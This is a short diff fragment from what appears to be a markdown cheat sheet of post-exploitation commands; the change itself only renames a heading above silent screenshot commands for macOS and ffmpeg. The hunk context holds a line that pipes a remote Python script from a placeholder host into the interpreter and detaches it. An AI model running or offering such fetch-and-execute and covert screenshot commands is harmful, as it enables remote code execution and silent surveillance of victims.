@@ -27,7 +27,7 @@ curl -s http://$IP:$PORT/Honigkuchenpferd.py | /usr/bin/python  & disown; killal
 ```
 screencapture -x /tmp/screenshot.jpg
 ```
-## gnu/linux:
+## ffmpeg:
 ### Screenshot
 ```
 ffmpeg -f x11grab -framerate 1 -i :0.0 -vframes 1 screenshot.jpg
